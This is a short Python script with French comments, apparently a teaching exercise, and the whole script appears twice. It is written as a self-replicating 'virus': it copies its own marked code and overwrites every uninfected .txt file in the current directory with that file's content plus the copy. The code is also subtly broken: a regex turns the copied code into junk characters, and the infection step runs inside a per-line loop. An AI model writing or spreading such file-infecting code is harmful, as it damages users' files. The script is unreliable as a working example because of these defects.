
import sys , re , glob
#debut du virus

#Mettons une copie du fichier dans une var list
codeVirus = []

#ouvrir ce fichier et lire toutes les lignes
cefichier = sys.argv[0]
fichiervirus = open(cefichier, "r")
lignes = fichiervirus.readlines()
fichiervirus.close()

#filtrer les lignes : ne pas considerer les lignes qui sont en dehors de nos
# marqueurs de debut et de fin puis sauvegarder les lignes filtrees dans le codevirus
#virus zone
virusZone = False
for ligne in lignes :
    if(re.search("^#debut du virus", ligne)):
        #le point de debut du virus trouver
        virusZone = True
        codeVirus.append(ligne)

     #Ajoutons les lignes dans le codevirus ssi
     #le point de debut de virus a ete trouve
    if (virusZone == True):
        ligne = re.sub("\w","34xx%#$",ligne)
        codeVirus.append(ligne)

    #Arretons l 'ajout ssi le point de fin du
    # virus a ete trouve
    if(re.search("^#fin du virus",ligne)):
        break

#Cherchons le potentiel fichier a infecter
fichiers = glob.glob('*.txt')

#verification et infectation des fichiers qui n ont
# pas ete infectes
for f in fichiers :
    #recuperation de chaque ligne du fichier
    fichier = open(f,'r')
    lignesfichier = fichier.readlines()
    fichier.close()

    #verification d infection
    infecter = False
    for ligne in lignesfichier :
        if (re.search("^#debut du virus",ligne)):
            print(f," -> deja infecter")
            infecter = True #Fichier infecte
            break # nous ne pouvons plus t'infecter

        #infecter
        if not infecter :
            newcode =[]
            #newcode = contenu du fichier + viruscode
            newcode = lignesfichier
            newcode.extend("\n")
            newcode.extend(codeVirus)

            #ouvrir le fichier et remplacer le contenu
            file = open(f,"w")
            file.writelines(newcode)
            file.close()

            #message
            print("\n -> infection",f)





import sys , re , glob
#creer d'abord un fichier texte dans le repertoire courant
#debut du virus

#Mettons une copie du fichier dans une var list
codeVirus = []

#ouvrir ce fichier et lire toutes les lignes
cefichier = sys.argv[0]
fichiervirus = open(cefichier, "r")
lignes = fichiervirus.readlines()
fichiervirus.close()

#filtrer les lignes : ne pas considerer les lignes qui sont en dehors de nos
# marqueurs de debut et de fin puis sauvegarder les lignes filtrees dans le codevirus
#virus zone
virusZone = False
for ligne in lignes :
    if(re.search("^#debut du virus", ligne)):
        #le point de debut du virus trouver
        virusZone = True
        codeVirus.append(ligne)

     #Ajoutons les lignes dans le codevirus ssi
     #le point de debut de virus a ete trouve
    if (virusZone == True):
        ligne = re.sub("\w","34xx%#$",ligne)
        codeVirus.append(ligne)

    #Arretons l 'ajout ssi le point de fin du
    # virus a ete trouve
    if(re.search("^#fin du virus",ligne)):
        break

#Cherchons le potentiel fichier a infecter
fichiers = glob.glob('*.txt')

#verification et infectation des fichiers qui n ont
# pas ete infectes
for f in fichiers :
    #recuperation de chaque ligne du fichier
    fichier = open(f,'r')
    lignesfichier = fichier.readlines()
    fichier.close()

    #verification d infection
    infecter = False
    for ligne in lignesfichier :
        if (re.search("^#debut du virus",ligne)):
            print(f," -> deja infecter")
            infecter = True #Fichier infecte
            break # nous ne pouvons plus t'infecter

        #infecter
        if not infecter :
            newcode =[]
            #newcode = contenu du fichier + viruscode
            newcode = lignesfichier
            newcode.extend("\n")
            newcode.extend(codeVirus)

            #ouvrir le fichier et remplacer le contenu
            file = open(f,"w")
            file.writelines(newcode)
            file.close()

            #message
            print("\n -> infection",f)


